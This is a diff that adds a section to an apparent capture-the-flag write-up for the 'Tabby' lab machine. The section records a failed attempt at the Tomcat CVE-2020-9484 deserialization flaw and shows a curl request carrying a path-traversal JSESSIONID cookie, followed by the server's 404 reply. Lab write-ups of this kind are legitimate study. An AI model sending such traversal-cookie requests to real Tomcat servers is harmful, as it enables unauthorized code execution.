@@ -292,3 +292,13 @@ tabby
 ~ # cat /etc/hostname
 mycontainer
 ```
+
+### CVE-2020-9484
+This exploit failed to work on our target website mainly because index.jsp cannot be found on the website. 
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl 'http://10.10.10.194:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
+
+<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> &#47;index.jsp</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.31 (Ubuntu)</h3></body></html> 
+```
